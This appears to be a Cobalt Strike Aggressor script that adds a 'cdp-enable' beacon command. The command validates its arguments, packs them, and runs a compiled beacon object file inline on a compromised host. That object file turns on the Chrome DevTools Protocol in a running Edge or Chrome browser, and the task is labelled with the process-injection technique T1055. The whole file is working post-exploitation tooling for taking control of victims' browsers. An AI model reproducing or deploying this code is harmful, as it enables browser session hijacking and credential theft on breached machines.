sub read_cdp_bof {
    local('$handle $data $object');
    $object = $2;
    $handle = openf(script_resource($object));
    $data = readb($handle, -1);
    closef($handle);
    if (strlen($data) == 0) {
        berror($1, "could not read $object");
    }
    return $data;
}

sub run_cdp_enable {
    local('$bid $browser $port $args $object $data $count');
    $bid = $1;
    $count = size(@_);

    if ($count < 2 || $count > 3) {
        berror($bid, "Usage: cdp-enable <edge|chrome|chrome-iso> [port]");
        return;
    }

    if (barch($bid) ne "x64") {
        berror($bid, "cdp-enable requires an x64 beacon");
        return;
    }

    $browser = lc($2);
    $port = 9222;
    if ($count == 3) {
        $port = int($3);
    }

    if ($browser ne "edge" && $browser ne "chrome" &&
        $browser ne "chrome-iso") {
        berror($bid, "browser must be 'edge', 'chrome', or 'chrome-iso'");
        return;
    }

    if ($port <= 8999 || $port > 65535) {
        berror($bid, "port must be between 9000 and 65535");
        return;
    }

    if ($browser eq "chrome-iso") {
        $object = "cdp_enable_iso_bof.o";
        $args = bof_pack($bid, "i", $port);
    }
    else {
        $object = "cdp_enable_bof.o";
        $args = bof_pack($bid, "zi", $browser, $port);
    }

    $data = read_cdp_bof($bid, $object);
    if (strlen($data) == 0) {
        return;
    }
    btask($bid, "Tasked beacon to enable CDP in $browser on port $port", "T1055");
    beacon_inline_execute($bid, $data, "go", $args);
}

alias("cdp-enable", &run_cdp_enable);

beacon_command_register(
    "cdp-enable",
    "Enable Chrome DevTools Protocol in a running browser.",
    "Usage: cdp-enable <edge|chrome|chrome-iso> [port]"
);
